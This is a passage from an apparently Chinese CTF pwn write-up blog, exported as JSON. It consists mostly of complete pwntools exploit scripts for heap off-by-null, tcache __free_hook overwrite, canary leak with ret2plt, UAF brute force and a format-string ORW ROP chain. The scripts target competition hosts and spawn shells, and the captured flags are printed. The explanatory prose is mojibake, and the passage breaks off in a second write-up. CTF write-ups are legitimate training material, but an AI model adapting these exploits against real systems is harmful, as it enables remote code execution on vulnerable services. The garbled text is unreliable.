local:\n    p = process(context.binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(context.binary)\nelse:\n    p = remote(\"121.36.194.21\",49155)\n    elf = ELF(binary)\n    libc = ELF(libc_file)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\nuu32    = lambda data   :u32(data.ljust(4, '\\0'))\nuu64    = lambda data   :u64(data.ljust(8, '\\0'))\nu64Leakbase = lambda offset :u64(ru(\"\\x7f\")[-6: ] + '\\0\\0') - offset\nu32Leakbase = lambda offset :u32(ru(\"\\xf7\")[-4: ]) - offset\nit      = lambda                    :p.interactive()\n\nmenu = \"Your choice: \"\n\ndef dockerDbg():\n\tmyGdb = remote(\"127.0.0.1\",30001)\n    myGdb.interactive()\n    myGdb.sendline('b *$rebase(0xdbd)')\n\tmyGdb.close()\n\tpause()\n#b *$rebase(0xdbd)\n\ndef dbg():\n\tgdb.attach(p)\n\tpause()\n    \ndef gdb_b(addr):\n    gdb.attach(p, \"b *$rebase({0}) \\n c\".format(addr))\n    sleep(0.5)\n\ndef lg(string,addr):\n    print('\\033[1;31;40m%20s-->0x%x\\033[0m'%(string,addr))\ndef add(idx,size):\n\tsla(menu, \"1\")\n\tsla(\"Index: \", str(idx))\n\tsla(\"Size: \", str(size))\n\ndef delete(idx):\n\tsla(menu, \"4\")\n\tsla(\"Index: \", str(idx))\n\ndef show(idx):\n\tsla(menu, \"3\")\n\tsla(\"Index: \", str(idx))\n\ndef edit(idx,con):\n\tsla(menu, \"2\")\n\tsla(\"Index: \", str(idx))\n\tsa(\"Content: \", con)\n\n\nfor i in range(0x7):\n\tadd(i,0xf8)\n\nfor i in range(0x7,0x7+0x7):\n\tadd(i,0x98)\n\nadd(0x14,0xf8)\t#0x14\n\nadd(0x15,0x98)\t#0x15\nadd(0x16,0xe8)\t#0x16\nadd(0x17,0xe8)\t#0x17\nadd(0x18,0xf8)\t#0x18\nadd(0x19,0xf8)\t#0x19\nadd(0x1a,0xf8)\t#0x1a\n\nfor i in range(0x7):\n\tdelete(i)\nfor i in range(0x7,0x7+0x7):\n\tdelete(i)\n\ndelete(0x15)\n#prented off by null\nedit(0x18,'\\x33'*0xf0+p64(0x300+0xa0-0x10-0x10)+'\\x00'+'\\n')\ndelete(0x19)\n\nfor i in range(0x7,0x7+0x7):\n\tadd(i,0x98)\n\nadd(0x1b,0x98)\nsleep(1)\nshow(0x1b)\nru(\"Content: \")\nlibc_base = u64Leakbase(0x3ec0b0)\nfree_hook = libc_base + libc.sym['__free_hook']\nsystem = libc_base + libc.sym['system']\none = libc_base + 0x4f432\nlg(\"libc_base\",libc_base)\nlg(\"free_hook\",free_hook)\nlg(\"system\",system)\nsleep(1)\n\nadd(0x1c,0xe8)\nadd(0x1d,0xe8)\ndelete(0x1d)\ndelete(0x1c)\nedit(0x16,p64(free_hook)+'\\n')\nadd(0x1e,0xe8)\nadd(0x1f,0xe8)\nedit(0x1f,p64(system)+'\\n')\nedit(0x14,'/bin/sh\\x00'+\"A\"*0x10+'\\n')\ndelete(0x14)\nit()\n\n#flag{m0lWJAzDB1vzxMn9PlMQXkPvEmGAdZzB}\n```\n\n# å››ã€old_school_revenge\n\nåˆšå¥½åˆå‡ºäº†ä¸ªoff by nullï¼ŒåŒæ ·å°±æ˜¯æ¨¡æ¿æ‰“\n\n```\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\nbinary = \"./old_school_revenge\"\ncontext.binary = binary\nlibc = ELF(context.binary.libc.path)\n#elf = ELF(binary)\ncontext.timeout = 0.2\n\nglobal p\n\n\nlocal = 0\nif local:\n    p = process(context.binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(context.binary)\nelse:\n    p = remote(\"123.60.63.39\",49155)\n    elf = ELF(binary)\n    libc = ELF(libc_file)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\nuu32    = lambda data   :u32(data.ljust(4, '\\0'))\nuu64    = lambda data   :u64(data.ljust(8, '\\0'))\nu64Leakbase = lambda offset :u64(ru(\"\\x7f\")[-6: ] + '\\0\\0') - offset\nu32Leakbase = lambda offset :u32(ru(\"\\xf7\")[-4: ]) - offset\nit      = lambda                    :p.interactive()\n\nmenu = \"Your choice: \"\n\ndef dockerDbg():\n\tmyGdb = remote(\"127.0.0.1\",30001)\n    myGdb.interactive()\n    myGdb.sendline('b *$rebase(0xdbd)')\n\tmyGdb.close()\n\tpause()\n#b *$rebase(0xdbd)\n\ndef dbg():\n\tgdb.attach(p)\n\tpause()\n    \ndef gdb_b(addr):\n    gdb.attach(p, \"b *$rebase({0}) \\n c\".format(addr))\n    sleep(0.5)\n\ndef lg(string,addr):\n    print('\\033[1;31;40m%20s-->0x%x\\033[0m'%(string,addr))\n\ndef add(idx,size):\n\tsla(menu, \"1\")\n\tsla(\"Index: \", str(idx))\n\tsla(\"Size: \", str(size))\n\ndef delete(idx):\n\tsla(menu, \"4\")\n\tsla(\"Index: \", str(idx))\n\ndef show(idx):\n\tsla(menu, \"3\")\n\tsla(\"Index: \", str(idx))\n\ndef edit(idx,con):\n\tsla(menu, \"2\")\n\tsla(\"Index: \", str(idx))\n\tsla(\"Content: \", con)\n\nfor i in range(0x7):\n\tadd(i,0xf8)\n\nfor i in range(0x7,0x7+0x7):\n\tadd(i,0x98)\n\nadd(0x14,0xf8)\t#0x14\n\nadd(0x15,0x98)\t#0x15\nadd(0x16,0xe8)\t#0x16\nadd(0x17,0xe8)\t#0x17\nadd(0x18,0xf8)\t#0x18\nadd(0x19,0xf8)\t#0x19\nadd(0x1a,0xf8)\t#0x1a\n\nfor i in range(0x7):\n\tdelete(i)\nfor i in range(0x7,0x7+0x7):\n\tdelete(i)\n\ndelete(0x15)\n#off by null\nedit(0x18,'\\x22'*0xf0+p64(0x300+0xa0-0x10-0x10))\ndelete(0x19)\n\nfor i in range(0x7,0x7+0x7):\n\tadd(i,0x98)\n\n\nadd(0x1b,0x98)\nsleep(1)\nshow(0x1b)\nru(\"Content: \")\nlibc_base = u64Leakbase(0x3ec0b0)\nfree_hook = libc_base + libc.sym['__free_hook']\nsystem = libc_base + libc.sym['system']\nlg(\"libc_base\",libc_base)\nlg(\"free_hook\",free_hook)\nlg(\"system\",system)\nsleep(1)\n\nadd(0x1c,0xe8)\nadd(0x1d,0xe8)\ndelete(0x1d)\ndelete(0x1c)\nedit(0x16,p64(free_hook))\nadd(0x1e,0xe8)\nadd(0x1f,0xe8)\nedit(0x1f,p64(system))\nedit(0x14,'/bin/sh\\x00'+\"\\x11\"*0x10)\ndelete(0x14)\nit()\n\n#flag{chz1IrUaAgSELXLciMeRB2XMeWQVZAKl}\n```\n\n# äº”ã€pwnpwn\n\næ³„éœ²canaryåç›´æ¥ret2pltå³å¯\n\n```\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\nbinary = \"./pwnpwn\"\ncontext.binary = binary\nlibc = ELF(context.binary.libc.path)\n#elf = ELF(binary)\ncontext.timeout = 0.2\n\nglobal p\n\n\nlocal = 0\nif local:\n    p = process(context.binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(context.binary)\nelse:\n    p = remote(\"124.71.156.217\",\"49155\")\n    elf = ELF(binary)\n    libc = ELF(libc_file)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\nuu32    = lambda data   :u32(data.ljust(4, '\\0'))\nuu64    = lambda data   :u64(data.ljust(8, '\\0'))\nu64Leakbase = lambda offset :u64(ru(\"\\x7f\")[-6: ] + '\\0\\0') - offset\nu32Leakbase = lambda offset :u32(ru(\"\\xf7\")[-4: ]) - offset\nit      = lambda                    :p.interactive()\n\nmenu = \"your choice>>\"\n\ndef dockerDbg():\n\tmyGdb = remote(\"127.0.0.1\",30001)\n    myGdb.interactive()\n    myGdb.sendline('b *$rebase(0xdbd)')\n\tmyGdb.close()\n\tpause()\n#b *$rebase(0xdbd)\n\ndef dbg():\n\tgdb.attach(p)\n\tpause()\n    \ndef gdb_b(addr):\n    gdb.attach(p, \"b *$rebase({0}) \\n c\".format(addr))\n    sleep(0.5)\n\ndef lg(string,addr):\n    print('\\033[1;31;40m%20s-->0x%x\\033[0m'%(string,addr))\n\n\nmain_addr = elf.sym['main']\nsystem_addr = elf.plt['system']\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\n\nsla(\"welcome to mimic world,try something\\n\",'1')\nru(\"let us give you some trick\\n0x\")\nelf_base = int(rc(12),16) - 0x9b9\nlg(\"elf_base\",elf_base)\nsl(\"2\")\nru(\"hello\\n\")\npayload = \"\"\npayload += \"M\"*(0x68)\nsl(payload)\nru(\"M\"*(0x68))\ncanary = u64(rc(8))-0xa\nlg(\"canary\",canary)\n\npayload1 = \"\"\npayload1 += \"D\"*(0x68)\npayload1 += p64(canary)\npayload1 += \"D\"*8\npayload1 += p64(elf_base + pop_rdi_ret)\npayload1 += p64(elf_base + 0x202010)\npayload1 += p64(elf_base + system_addr)\npayload1 += p64(elf_base + main_addr)\n\n\nsl(payload1)\np.interactive()\n\n#flag{63YGBWA1c0pfPrLqhQPiiGJCOl7JWMD9}\n```\n\n# å…­ã€random_heap\n\nè¿™é“é¢˜ç›®æ¯”è¾ƒæœ‰æ„æ€ï¼Œè™½ç„¶æ˜¯æœ€ç®€å•çš„UAFï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆæ¯æ¬¡éƒ½ä¼šéšæœºæ›´æ¢binä¸­chunkçš„ä½ç½®ï¼Œä½†æ˜¯å¯¹åº”çš„ç´¢å¼•chunkå…¶å®è¿˜æ˜¯ä¸å˜çš„ï¼Œæ‰€ä»¥ç›´æ¥çˆ†ç ´å°±å¥½ã€‚ä½†æ˜¯è¿™ä¸ªä¹Ÿå¯ä»¥é€šè¿‡å¡«æ»¡0x100ä»¥ä¸‹å¤§å°çš„tcacheæ¥æ›´å¤§æ¦‚ç‡getshellã€‚\n\n```\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\nbinary = \"./random_heap\"\ncontext.binary = binary\nlibc = ELF(context.binary.libc.path)\n#elf = ELF(binary)\ncontext.timeout = 0.2\n\nglobal p\n\n\nlocal = 0\nif local:\n    p = process(context.binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(context.binary)\nelse:\n    p = remote(\"124.71.140.198\",\"49153\")\n    elf = ELF(binary)\n    libc = ELF(libc_file)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\nuu32    = lambda data   :u32(data.ljust(4, '\\0'))\nuu64    = lambda data   :u64(data.ljust(8, '\\0'))\nu64Leakbase = lambda offset :u64(ru(\"\\x7f\")[-6: ] + '\\0\\0') - offset\nu32Leakbase = lambda offset :u32(ru(\"\\xf7\")[-4: ]) - offset\nit      = lambda                    :p.interactive()\n\nmenu = \"Your choice: \"\n\ndef dockerDbg():\n\tmyGdb = remote(\"127.0.0.1\",30001)\n    myGdb.interactive()\n    myGdb.sendline('b *$rebase(0xdbd)')\n\tmyGdb.close()\n\tpause()\n#b *$rebase(0xdbd)\n\ndef dbg():\n\tgdb.attach(p)\n\tpause()\n    \ndef gdb_b(addr):\n    gdb.attach(p, \"b *$rebase({0}) \\n c\".format(addr))\n    sleep(0.5)\n\ndef lg(string,addr):\n    print('\\033[1;31;40m%20s-->0x%x\\033[0m'%(string,addr))\n\ndef add(idx,size):\n\tsla(menu,'1')\n\tsla('Index: ',str(idx))\n\tsla('Size: ',str(size))\ndef edit(idx,con):\n\tsla(menu,'2')\n\tsla('Index: ',str(idx))\n\tsla('Content: ',con)\ndef show(idx):\n\tsla(menu,'3')\n\tsla('Index: ',str(idx))\ndef delete(idx):\n\tsla(menu,'4')\n\tsla('Index: ',str(idx))\n\n\n#normal UAF\nadd(0,0x98)\nadd(1,0x28)\nfor i in range(8):\n\tedit(0,\"D\"*16)\n\tdelete(0)\n#leak libc\nshow(0)\nlibc_base = u64Leakbase(96+0x10+libc.sym['__malloc_hook'])\n\n__free_hook_addr = libc_base + libc.sym['__free_hook']\nsystem_addr = libc_base + libc.sym['system']\nlg(\"libc_base\",libc_base)\nlg(\"__free_hook_addr\",__free_hook_addr)\nlg(\"system_addr\",system_addr)\nadd(2,0x28)\ndelete(2)\nedit(2,p64(__free_hook_addr)+p64(0))\nedit(1,'/bin/sh\\x00')\n\ndbg()\n#prented random\nwhile True:\n\ttry:\n\t\tadd(3,0x48)\n\t\tadd(4,0x48)\n\t\tedit(4,p64(system_addr))\n\t\tedit(3,'/bin/sh\\x00')\n\t\tdelete(3)\n\t\tdelete(4)\n\texcept:\n\t\tit()\n\n#flag{bdcef975ec2589f3e58d105d06587798}\n```\n\n# ä¸ƒã€bornote\n\nè¿™é“é¢˜ç›®è´¼å‚»é€¼ï¼Œæœ€å¼€å§‹ä¾æ®urandomç”³è¯·äº†ä¸€ä¸ªéšæœºå¤§å°chunkï¼Œå¯¼è‡´å †å¸ƒå±€ä¼šå¤±æ•ˆã€‚ä½†æ˜¯ç”±äºé¢˜ç›®è®¾ç½®ï¼Œå®é™…ä¸Šä¹Ÿå°±å­˜åœ¨å¤§æ¦‚åæ¥ç§å¤§å°çš„chunkï¼Œé€‰ä¸€ä¸ªå®ä¾‹çˆ†ç ´ä¸€ä¸‹å³å¯ã€‚ä½†æ˜¯æœ€å¼€å§‹æˆ‘å±…ç„¶è¿˜ä»¥ä¸ºè¿™ä¸ªæ˜¯å¾ˆéšæœºçš„ï¼Œç›´æ¥å‡è®¾ç”³è¯·äº†240å¤§å°çš„Chunkï¼Œç»“æœçˆ†äº†ä¸€æ™šä¸Šéƒ½æ²¡çˆ†å‡ºæ¥ï¼Œå®åœ¨æ˜¯å‚»é€¼äº†ã€‚ä¹‹åå°±æ˜¯æ­£å¸¸çš„2.31ä¸‹çš„off by nulläº†ã€‚\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\nbinary = \"./note\"\ncontext.binary = binary\nlibc = ELF(context.binary.libc.path)\n#elf = ELF(binary)\ncontext.timeout = 0.2\n\nglobal p\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\nuu32    = lambda data   :u32(data.ljust(4, '\\0'))\nuu64    = lambda data   :u64(data.ljust(8, '\\0'))\nu64Leakbase = lambda offset :u64(ru(\"\\x7f\")[-6: ] + '\\0\\0') - offset\nu32Leakbase = lambda offset :u32(ru(\"\\xf7\")[-4: ]) - offset\nit      = lambda                    :p.interactive()\n\nmenu = \"cmd: \"\n\ndef dockerDbg():\n\tmyGdb = remote(\"127.0.0.1\",30001)\n    myGdb.interactive()\n    myGdb.sendline('b *$rebase(0xdbd)')\n\tmyGdb.close()\n\tpause()\n#b *$rebase(0xdbd)\n\ndef dbg():\n\tgdb.attach(p)\n\tpause()\n    \ndef gdb_b(addr):\n    gdb.attach(p, \"b *$rebase({0}) \\n c\".format(addr))\n    sleep(0.5)\n\ndef lg(string,addr):\n    print('\\033[1;31;40m%20s-->0x%x\\033[0m'%(string,addr))\n\ndef add(size):\n\tsla(menu, \"1\")\n\tsla(\"Size: \", str(size))\n\ndef delete(idx):\n\tsla(menu, \"2\")\n\tsla(\"Index: \", str(idx))\n\ndef show(idx):\n\tsla(menu, \"4\")\n\tsla(\"Index: \", str(idx))\n\ndef edit(idx,con):\n\tsla(menu, \"3\")\n\tsla(\"Index: \", str(idx))\n\tsla(\"Note: \", con)\n\ndef pwn():\n\tsla(\"username: \",\"DBDX\")\n\tadd(0x478)\n\tadd(0x478)\n\tadd(0x478)\n\tdelete(0)\n\tdelete(1)\n\tdelete(2)\n\n\t#0x9f0\n\tadd(0x118)\n\tedit(0,'\\x11'*0x10)\n\tadd(0x418) #1 fd 0x---2b0\n\tadd(0x108) #2\n\tadd(0x418) #3\n\tadd(0x438) #4 unlink_chunk 0x---c00\n\tadd(0x108) #5\n\tadd(0x428) #6 bk 0x---150\n\tadd(0x208) #7\n\t#left fd bk in 0x---c00\n\tdelete(1)\n\tdelete(4)\n\tdelete(6)\n\t#merge and carve to get 0x---c20 and change size which in 0x---c00 \n\tdelete(3)\n\t\n\tadd(0x438) #8 set size  \t\t\t\n\tedit(1,'\\x08'*0x418 + '\\x91'+'\\x0b')\n\t\n\t#reply\t\n\tadd(0x418) # 9 0x---c20 \t\t\t\t\t\t\n\tadd(0x428) # 10 bk 0x---150 \t\t\t\t\t\n\tadd(0x418) # 11 fd 0x---2b0 \t\t\t\t\t\n\t\n\t#repair fd\n\tdelete(6) #0x---2b0  \t\t11\n\tdelete(3) #0x---c20 \t\t9\n\tadd(0x418) # 12 0x---2b0 to overflow \\x00 in fd  \t\n\tedit(3,'DBDXZNBA')\n\tadd(0x418) # 13 0x---c20 \t\t\t\t\t\t\t\n\n\n\t#repair bk\n\tdelete(6) \t\t#13\n\tdelete(4) \t\t#4\n\t\n\tadd(0x5f8) #14 let 0x---150 0x---c20 into largebin  \t\n\t\n\tadd(0x428) # 15 0x---150 to overflow \\x00 in fd  \t\t\t\t\n\tedit(6,'')\n\t\n\t#trigger off-by-null\n\tedit(7,'\\x77'*0x200+p64(0xb90))\n\tadd(0x18)\t\t\t\n\tdelete(4)\n\tadd(0x18)\t\t\t\n\tadd(0x3d8)\n\tshow(4)\n\tru(\"Note: \")\n\tlibc_base = u64Leakbase(96+0x10+libc.sym['__malloc_hook'])\n\tfree_hook = libc_base + libc.sym['__free_hook']\n\tsystem_addr = libc_base + libc.sym['system']\n\tone = libc_base + 0xe6c81\n\tlg(\"libc_base\",libc_base)\n\tlg(\"free_hook\",free_hook)\n\tlg(\"system_addr\",system_addr)\n\tdelete(0)\n\tdelete(2)\n\tadd(0x48)\n\tadd(0x18)\n\t\n\tdelete(1)\n\tdelete(3)\n\tdelete(2)\n\tdelete(8)\n\t\n\tedit(0,'/bin/sh\\x00'+p64(0x0)\n\t\t+p64(0x440)+p64(0x20)\n\t\t+p64(free_hook))\n\t\n\tadd(0x18)\n\tadd(0x18)\n\t\n\tedit(2,p64(one))\n\tdelete(0)\n\tit()\n\n\n    i = 0\n    while True:\n        i += 1\n        log.info(\"Times:%d\"%i)\n        try:\n            p = remote(\"121.36.250.162\",49153)\n            #p = process(\"./bornote\")\n            pwn()\n        except EOFError:\n            p.close()\n            continue\n        else:\n            p.interactive()\n            break\n\n\n\n#flag{d483f651c1cbcad9a7bb87d04d498ea7}\n```\n\n# å…«ã€oldecho\n\nè¿™é“é¢˜ç›®æœ€æœ‰æ„æ€äº†ï¼Œclose(1)ï¼Œç„¶åå¾ªç¯çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ã€‚éœ€è¦æ”¹stdoutçš„filenoä¸º2æ‰èƒ½æ¢å¤è¾“å‡ºã€‚åŒæ—¶ç”±äºclose(1)ï¼Œå¯¼è‡´æ ¼å¼åŒ–è¾“å‡ºprintfçš„å¤§å°ä¸èƒ½å¤ªå¤§ï¼Œå¤§æ¦‚0x2000å·¦å³å°±ä¸è¡Œäº†ï¼Œæ‰€ä»¥ä¹Ÿéœ€è¦çˆ†ç ´ä¸€ä¸‹ã€‚ä¹‹ååˆç”±äºæ ˆç¯å¢ƒé—®é¢˜ï¼Œè¿™é‡Œç»™äº†æ ˆåœ°å€ï¼Œä½†ä¹Ÿæ˜¯éœ€è¦çˆ†ç ´ä¸€ä¸‹æœ€åçš„ä¸€äº›å¤§å°é—®é¢˜ï¼Œå¤§æ¦‚è®¾ç½®åœ¨ä¸€å®šèŒƒå›´å¯æ§ã€‚\n\næ­¤å¤–ç”±äºæ ˆä¸Šæ²¡æœ‰stdoutï¼Œæ‰€ä»¥éœ€è¦æŠ¬æ ˆï¼Œæ¯”èµ›çš„æ—¶å€™æ²¡åšè¿‡æ”¹filenoçš„ï¼Œæ˜¯å­¦é•¿åšçš„ã€‚èµ›åç…§ç€è‡ªå·±çš„æ€è·¯å¤ç°äº†ä¸€ä¸‹ï¼Œå…ˆè¦†ç›–è¿”å›åœ°å€è¿”å›åˆ°ä¸Šä¸€å±‚å‡½æ•°ï¼Œå³mainå‡½æ•°ä¸­ï¼Œä¹‹åå†è¿”å›åˆ°startï¼Œä¹‹åå°±ä½¿å¾—å¯ä»¥åœ¨æ ˆä¸Šç•™ä¸‹IO_2_1_stoutã€‚(è¿™é‡Œå…·ä½“ä¸ºä»€ä¹ˆä¼šå‡ºç°æˆ‘ä¹Ÿä¸å¤ªæ‡‚)\n\nç„¶åå°±æ˜¯æ”¹è¿”å›åœ°å€ï¼Œpop rbpå°†è¾“å…¥çš„bssæ®µç»™rbpï¼Œç„¶åå€ŸåŠ©leave retæŒ‡ä»¤å°†rbpç»™åˆ°rspï¼ŒåŠ«æŒæ ˆåˆ°è¾“å…¥çš„bssæ®µä¸Šï¼Œä¹‹åå°±æ˜¯æ­£å¸¸çš„ORWã€‚\n\nè¿™é‡Œå€ŸåŠ©æ ˆå¯»æ‰¾gadgetä¹Ÿæ˜¯ä¸€ä¸ªå°éš¾ç‚¹ã€‚\n\n```\nfrom pwn import *\nimport sys\n\nbinary = \"./oldecho\"\ncontext.log_level = \"debug\"\n#context.binary = binary\ncontext.arch = \"amd64\"\nelf = ELF(binary)\nlibc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\")\n\n\nglobal p\n\n\n\ndef dbg():\n    gdb.attach(p)\n    pause()\n\ndef dockerDbg():\n    myGdb = remote(\"127.0.0.1\",30001)\n    myGdb.close()\n    pause()\n#b *$rebase(0xdbd)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\nuu32    = lambda data   :u32(data.ljust(4, '\\0'))\nuu64    = lambda data   :u64(data.ljust(8, '\\0'))\nu64Leakbase = lambda offset :u64(ru(\"\\x7f\")[-6: ] + '\\0\\0') - offset\nu32Leakbase = lambda offset :u32(ru(\"\\xf7\")[-4: ]) - offset\nit      = lambda                    :p.interactive()\n\n\ndef lg(string,addr):\n    print('\\033[1;31;40m%20s-->0x%x\\033[0m'%(string,addr))\n\n\ndef pwn():\n    #p = remote(\"123.60.32.152\",49153)\n    p.recvuntil('Gift: ')\n    stack = int(p.recv(14),16)\n    log.info('Stack:\\t' + hex(stack))\n    offset = 9\n    retval = stack&0xFFFF\n    if retval > 0x2000:\n        raise Exception(\"Invalid stack!\")\n\n    retval1 = stack&0xFF\n    if retval1 <= 0x50:\n        raise Exception(\"Invalid stack!\")\n    \n    retval2 = stack&0xFF\n    if retval1 >= 0xe8:\n        raise Exception(\"Invalid stack!\")\n    \n    #return to 0xe40 main to get io_2_1_stdout\n    p.recv()\n    p.sendline('%' + str(((stack&0xFF) - 0x10)) + 'c%6$hhn')\n    p.sendline('%'+ str(0x40) + 'c%10$hhn')\n    \n    #return to start\n    p.sendline('%' + str(((stack&0xFF) - 0x38)) + 'c%6$hhn')\n    p.sendline('%'+ str(0x3f) + 'c%10$hhn')\n \n\n    #change list to io\n    p.sendline('%' + str(((stack&0xFF) - 0x80)) + 'c%15$hhn')\n    #pause()\n    \n    #change IO fileno\n    p.sendline('%' + str(0x90) + 'c%41$hhn')\n    p.sendline('%'+ str(0x2) + 'c%29$hhnGet')\n    # p.recvuntil('xxxx',timeout=0.5)\n    # #dockerDbg()\n    test = 'AAAA'\n    leakPl =  \"ELF:%7$p.Libc:%13$p\"\n    \n    # p.sendline(test)\n    ru(\"Get\")\n    #dockerDbg()\n    p.sendline(leakPl)\n    #pause()\n    #p.interactive()\n    ru(\"ELF:0x\")\n    elf_base = int(rc(12),16) -0xe1e\n    ru(\"Libc:0x\")\n    libc_base = int(rc(12),16) - 240 -libc.sym['__libc_start_main']\n    if libc_base&0xFFFF > 0x2000:\n        raise Exception(\"Invalid Libc!\")\n    # print(elf_base)\n    # print(libc_base)\n    lg(\"elf_base\",elf_base)\n    lg(\"libc_base\",libc_base)\n    #pause()\n    \n    pop_rbp_r13_r14_ret =libc_base + 0x00000000000206d1\n    pop_rsi_ret = libc_base + 0x00000000000202f8\n    pop_rdi_ret = libc_base + 0x0000000000021112\n    pop_rdx_ret = libc_base + 0x0000000000001b92\n    pop_rdx_rsi = libc_base + 0x00000000001151c9\n    pop_rax_ret = libc_base + 0x000000000003a738\n    xchg_eax_esp_ret = libc_base + 0x0aa985\n    Open = libc_base + libc.sym['open']\n    Read = libc_base + libc.sym['read']\n    Puts = libc_base + libc.sym['puts']\n    orw  = './flag\\x00\\x00'\n    orw += p64(pop_rdi_ret) + p64(elf_base + 0x202060)\n    orw += p64(pop_rsi_ret) + p64(0) \n    orw += p64(Open)\n    orw += p64(pop_rdi_ret) + p64(1)\n    orw += p64(pop_rsi_ret) + p64(elf_base + 0x2020F0)\n    orw += p64(pop_rdx_ret) + p64(0x30)\n    orw += p64(Read)\n    orw += p64(pop_rdi_ret) + p64(elf_base + 0x2020F0)\n    orw += p64(Puts)\n\n\n\n    #dockerDbg()\n    p.sendline('%' + str(((stack&0xFF)+0x8)) + 'c%6$hhn')\n    p.sendline('%'+ str(0x60) + 'c%10$hhn')\n    #pause()\n\n\n    #dockerDbg()\n    p.sendline('%' + str(((stack&0xFF)+ 0x20)) + 'c%6$hhn')\n    p.sendline('%'+ str(0x3e) + 'c%10$hhn')\n    #pause()\n    \n    #dockerDbg()\n    p.sendline('%' + str(((stack&0xFF))) + 'c%6$hhn')\n    p.sendline('%'+ str(pop_rbp_r13_r14_ret&0xFFFF) + 'c%10$hn')\n    #pause()\n\n\n    #dockerDbg()\n    payload = \"\"\n    payload += \"Bye~\"\n    payload = payload.ljust(0x20,'\\x00')\n    payload += orw\n    p.sendline(payload)\n    it()\n\n\ni = 0\nwhile True:\n    i += 1\n    log.info(\"Times:%d\"%i)\n    try:\n        p = process(binary)\n        pwn()\n    except EOFError:\n        p.close()\n        continue\n    except Exception:\n        p.close()\n        continue\n    else:\n        p.interactive()\n        break\nit()\n\n\n# flag{NpfH6fzHStuKl2CRfvheXWyKO3Bz60F5}\n```\n\næ€»çš„æ¥è¯´è¿™æ¬¡pwnç€å®æœ‰ç‚¹æ°´ï¼Œå’Œå¼ºç½‘æ¯ä¸€æ¯”å·®å¥½è¿œå•Šã€‚\n","tags":["å¼ºç½‘æ‹Ÿæ€WP"],"categories":["å¼ºç½‘æ‹Ÿæ€WP"]},{"title":"é¹¤åŸæ¯WP","url":"/2021/10/24/é¹¤åŸæ¯WP/","content":"\n# å‰è¨€\n\nè¿™æ¬¡æ¯”èµ›å°±å‘çˆ¹\n\n# ä¸€ã€babyof\n\næ ˆæº¢å‡ºç™½ç»™ï¼Œæ³„éœ²åœ°å€åç›´æ¥æ‰“å³å¯\n\n```python\n# -*- coding:UTF-8 -*-\n\nfrom pwn import *\nfrom LibcSearcher import *\n\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\nbinary = \"./babyof\"\n#libc.so = \"./libc-2.24.so\"\n#libc.so = \"\"\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)  \n\n\n#libcsearcher use\n'''\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\")        #system\nbinsh_addr = libc_base + 